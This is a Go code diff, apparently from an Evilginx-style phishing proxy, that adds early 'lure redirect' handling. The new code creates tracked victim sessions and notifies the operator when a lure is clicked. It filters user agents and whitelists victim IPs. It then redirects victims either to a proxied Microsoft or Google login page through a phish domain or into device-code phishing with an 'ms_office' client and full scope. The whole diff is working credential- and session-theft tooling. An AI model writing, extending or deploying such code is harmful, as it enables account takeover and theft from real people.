@@ -130,6 +130,274 @@ func (p *HttpProxy) registerSubAlias(realPhishSub string, phishDomain string) st
 	return combineHost(alias, phishDomain)
 }
 
+// handleLureRedirect checks if the incoming request matches a lure URL.
+// If it does, it creates a new session and immediately redirects the visitor
+// to the login page via the phish domain. This is called EARLY in the request
+// handler to bypass all complex matching logic. Returns (req, resp) if handled,
+// or (nil, nil) if the request is not a lure hit.
+func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string) (*http.Request, *http.Response) {
+	reqPath := req.URL.Path
+	reqHost := strings.ToLower(req.Host)
+
+	// Strip port from host if present
+	if h, _, err := net.SplitHostPort(reqHost); err == nil {
+		reqHost = h
+	}
+
+	log.Debug("[lure-redirect] checking host='%s' path='%s'", reqHost, reqPath)
+
+	// Find matching lure
+	for i, l := range p.cfg.lures {
+		if l.Path != reqPath {
+			continue
+		}
+		if !p.cfg.IsSiteEnabled(l.Phishlet) {
+			log.Debug("[lure-redirect] lure[%d] phishlet '%s' not enabled", i, l.Phishlet)
+			continue
+		}
+
+		pl, err := p.cfg.GetPhishlet(l.Phishlet)
+		if err != nil {
+			log.Debug("[lure-redirect] lure[%d] GetPhishlet error: %v", i, err)
+			continue
+		}
+
+		// Get the phish domain for this phishlet
+		phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+		if !ok || phishDomain == "" {
+			// Fallback to base domain
+			phishDomain = p.cfg.GetBaseDomain()
+			log.Debug("[lure-redirect] lure[%d] GetSiteDomain empty, using base domain: %s", i, phishDomain)
+		}
+
+		// Verify this host belongs to this phishlet
+		hostMatch := false
+		if l.Hostname != "" && l.Hostname == reqHost {
+			hostMatch = true
+		} else {
+			for _, ph := range pl.proxyHosts {
+				expected := combineHost(ph.phish_subdomain, phishDomain)
+				if reqHost == expected {
+					hostMatch = true
+					break
+				}
+			}
+		}
+
+		if !hostMatch {
+			log.Debug("[lure-redirect] lure[%d] host '%s' doesn't match phishlet '%s' (domain: %s)", i, reqHost, pl.Name, phishDomain)
+			continue
+		}
+
+		log.Important("[lure-redirect] MATCH! lure[%d] phishlet='%s' path='%s' host='%s'", i, pl.Name, reqPath, reqHost)
+
+		// Check if visitor already has a session cookie
+		sessionCookie := getSessionCookieName(pl.Name, p.cookieName)
+		if sc, err := req.Cookie(sessionCookie); err == nil {
+			if _, ok := p.sids[sc.Value]; ok {
+				log.Debug("[lure-redirect] visitor already has session, skipping lure redirect")
+				return nil, nil // Let the normal flow handle existing sessions
+			}
+		}
+
+		// Check if lure is paused
+		if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
+			log.Warning("[lure-redirect] lure is paused")
+			return p.blockRequest(req)
+		}
+
+		// Check user-agent filter
+		if len(l.UserAgentFilter) > 0 {
+			re, err := regexp.Compile(l.UserAgentFilter)
+			if err == nil && !re.MatchString(req.UserAgent()) {
+				log.Warning("[lure-redirect] user-agent rejected: %s", req.UserAgent())
+				return p.blockRequest(req)
+			}
+		}
+
+		// Create session
+		session, err := NewSession(pl.Name, p.cfg)
+		if err != nil {
+			log.Error("[lure-redirect] NewSession failed: %v", err)
+			continue
+		}
+
+		// Extract params
+		p.extractParams(session, req.URL)
+		if email := req.URL.Query().Get("email"); email != "" {
+			session.Params["email"] = email
+		}
+
+		sid := p.last_sid
+		p.last_sid += 1
+		p.sessions[session.Id] = session
+		p.sids[session.Id] = sid
+
+		log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, pl.Name, req.UserAgent(), from_ip)
+		log.Info("[%d] [%s] landing URL: %s", sid, pl.Name, req.URL.String())
+
+		// Store in DB
+		landingUrl := req.URL.Scheme + "://" + req.Host + req.URL.Path
+		if err := p.db.CreateSession(session.Id, pl.Name, landingUrl, req.UserAgent(), from_ip); err != nil {
+			log.Error("database: %v", err)
+		}
+
+		session.RemoteAddr = from_ip
+		session.UserAgent = req.UserAgent()
+		session.RedirectURL = pl.RedirectUrl
+		if l.RedirectUrl != "" {
+			session.RedirectURL = l.RedirectUrl
+		}
+		session.PhishLure = l
+		p.whitelistIP(from_ip, session.Id, pl.Name)
+
+		// Send lure_clicked notification
+		lureUrl := fmt.Sprintf("https://%s%s", req.Host, l.Path)
+		p.notifier.Trigger(EventLureClicked, &NotificationData{
+			Origin:    from_ip,
+			LureURL:   lureUrl,
+			Phishlet:  pl.Name,
+			SessionID: session.Id,
+			UserAgent: req.UserAgent(),
+		})
+
+		// Handle device code modes
+		dcMode := l.DeviceCodeMode
+		if dcMode == "" {
+			if plDC := pl.GetDeviceCodeConfig(); plDC != nil && plDC.Mode != "" {
+				dcMode = plDC.Mode
+			}
+		}
+		if dcMode == "" {
+			dcMode = DCModeOff
+		}
+		session.DCMode = dcMode
+
+		// DCModeDirect: skip AitM, show device code interstitial
+		if dcMode == DCModeDirect {
+			dcClient := l.DeviceCodeClient
+			dcScope := l.DeviceCodeScope
+			if dcClient == "" {
+				dcClient = "ms_office"
+			}
+			if dcScope == "" {
+				dcScope = "full"
+			}
+			session.DCState = DCStatePending
+			capturedSid := sid
+			capturedSession := session
+			go func() {
+				dcSess, err := p.deviceCode.RequestDeviceCode(dcClient, dcScope)
+				if err != nil {
+					log.Error("[%d] [devicecode] failed: %v", capturedSid, err)
+					capturedSession.DCState = DCStateFailed
+					return
+				}
+				p.deviceCode.LinkToAitmSession(dcSess.ID, capturedSession.Id)
+				capturedSession.DCSessionID = dcSess.ID
+				capturedSession.DCUserCode = dcSess.UserCode
+				capturedSession.DCState = DCStateWaiting
+				log.Important("[%d] [devicecode] DIRECT code: %s", capturedSid, dcSess.UserCode)
+				p.deviceCode.StartPolling(dcSess.ID)
+			}()
+			dcTheme := l.DeviceCodeTheme
+			interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
+			if dcTheme != "" && dcTheme != "default" {
+				interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
+			}
+			resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "")
+			resp.Header.Set("Location", interstitialURL)
+			resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+			return req, resp
+		}
+
+		// DCModeAlways: redirect to device code interstitial
+		if dcMode == DCModeAlways {
+			dcClient := l.DeviceCodeClient
+			dcScope := l.DeviceCodeScope
+			if dcClient == "" {
+				dcClient = "ms_office"
+			}
+			if dcScope == "" {
+				dcScope = "full"
+			}
+			session.DCState = DCStatePending
+			go func() {
+				dcSess, err := p.deviceCode.RequestDeviceCode(dcClient, dcScope)
+				if err != nil {
+					log.Error("[%d] [devicecode] failed: %v", sid, err)
+					return
+				}
+				p.deviceCode.LinkToAitmSession(dcSess.ID, session.Id)
+				session.DCSessionID = dcSess.ID
+				session.DCUserCode = dcSess.UserCode
+				session.DCState = DCStateWaiting
+				log.Important("[%d] [devicecode] code: %s", sid, dcSess.UserCode)
+				p.deviceCode.StartPolling(dcSess.ID)
+			}()
+			dcTheme := l.DeviceCodeTheme
+			interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
+			if dcTheme != "" && dcTheme != "default" {
+				interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
+			}
+			resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+			resp.Header.Set("Location", interstitialURL)
+			resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+			return req, resp
+		}
+
+		// AitM flow (default): redirect to login page through phish domain
+		// Find the phish subdomain that proxies to the login domain
+		loginPhishHost := ""
+		loginDomain := pl.GetLoginUrl() // e.g., "https://login.microsoftonline.com/"
+		if lu, err := url.Parse(loginDomain); err == nil {
+			loginOrigHost := lu.Host
+			for _, ph := range pl.proxyHosts {
+				origHost := combineHost(ph.orig_subdomain, ph.domain)
+				if strings.EqualFold(origHost, loginOrigHost) {
+					loginPhishHost = combineHost(ph.phish_subdomain, phishDomain)
+					break
+				}
+			}
+		}
+		if loginPhishHost == "" {
+			// Fallback: try common patterns
+			for _, ph := range pl.proxyHosts {
+				if strings.Contains(ph.domain, "microsoftonline") || strings.Contains(ph.domain, "google") {
+					if strings.Contains(ph.orig_subdomain, "login") || strings.Contains(ph.orig_subdomain, "accounts") {
+						loginPhishHost = combineHost(ph.phish_subdomain, phishDomain)
+						break
+					}
+				}
+			}
+		}
+		if loginPhishHost == "" {
+			loginPhishHost = "secure." + phishDomain // last resort
+		}
+		redirectUrl := "https://" + loginPhishHost + "/"
+		log.Important("[%d] [lure-redirect] AitM redirect to: %s", sid, redirectUrl)
+
+		// Use JavaScript redirect - immune to response handler URL rewriting
+		body := fmt.Sprintf(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Redirecting...</title></head><body><script>window.location.replace('%s');</script><noscript><meta http-equiv="refresh" content="0;url=%s"></noscript></body></html>`, redirectUrl, redirectUrl)
+		resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+		resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+		resp.Header.Set("Pragma", "no-cache")
+		// Set session cookie
+		ck := &http.Cookie{
+			Name:    sessionCookie,
+			Value:   session.Id,
+			Path:    "/",
+			Domain:  p.cfg.GetBaseDomain(),
+			Expires: time.Now().Add(60 * time.Minute),
+		}
+		resp.Header.Add("Set-Cookie", ck.String())
+		return req, resp
+	}
+
+	log.Debug("[lure-redirect] no matching lure for host='%s' path='%s'", reqHost, reqPath)
+	return nil, nil
+}
+
 // Advanced parameter generation state - rotates through different strategies
 var paramGenState = struct {
 	sync.Mutex
@@ -1214,6 +1482,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					return p.blockRequest(req)
 				}
 			}
+
+			// ════════════════════════════════════════════════════════════════════════
+			// EARLY LURE REDIRECT - Handle lure URLs before any other processing.
+			// This ensures lure visitors get redirected to login immediately,
+			// bypassing all complex phishlet/domain matching that could fail.
+			// ════════════════════════════════════════════════════════════════════════
+			if req.Method == "GET" {
+				if lReq, lResp := p.handleLureRedirect(req, from_ip); lResp != nil {
+					return lReq, lResp
+				}
+			}
+			// ════════════════════════════════════════════════════════════════════════
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			// o_host := req.Host
